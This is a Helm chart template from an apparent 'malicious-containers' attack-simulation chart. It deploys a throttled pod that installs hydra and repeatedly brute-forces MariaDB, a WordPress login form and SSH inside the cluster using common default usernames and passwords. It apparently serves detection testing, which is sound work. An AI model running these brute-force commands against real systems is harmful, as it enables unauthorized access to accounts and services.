{{- if .Values.bruteforce.enabled }}
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{ include "malicious-containers.fullname" . }}-bruteforce
  labels:
    {{- include "malicious-containers.labels" . | nindent 4 }}
    app.kubernetes.io/component: bruteforce
    kids-label: "1"
spec:
  replicas: 1
  selector:
    matchLabels:
      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
      app.kubernetes.io/component: bruteforce
  template:
    metadata:
      labels:
        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
        app.kubernetes.io/component: bruteforce
        kids-label: "1"
    spec:
      {{- with .Values.nodeSelector }}
      nodeSelector:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      {{- with .Values.tolerations }}
      tolerations:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      containers:
        - name: bruteforce
          image: {{ .Values.bruteforce.image }}
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache hydra 2>/dev/null || apt-get install -y hydra 2>/dev/null || true
              echo "Starting brute-force attack simulation (throttled)..."

              printf 'admin\nroot\nuser\ntest\nguest\n' > /tmp/users.txt
              printf 'password\n123456\nadmin\nroot\nletmein\nchangeme\n' > /tmp/passwords.txt

              while true; do
                echo "[$(date)] Brute-force cycle start"

                echo "[$(date)] Attacking MariaDB..."
                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
                  mysql://mariadb-sysbench-service.benign-workloads.svc.cluster.local \
                  -t 1 -w 10 -f 2>&1 || true

                sleep 120

                echo "[$(date)] Attacking WordPress..."
                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
                  http-post-form://wordpress-app.benign-workloads.svc.cluster.local \
                  -m "/:username=^USER^&password=^PASS^:Invalid" \
                  -t 1 -w 10 -f 2>&1 || true

                sleep 120

                echo "[$(date)] Attacking SSH..."
                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
                  ssh://10.0.1.27 -t 1 -w 10 -f 2>&1 || true

                echo "[$(date)] Cycle complete. Sleeping 300s "
                sleep 300
              done
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              cpu: 100m
              memory: 128Mi
{{- end }}
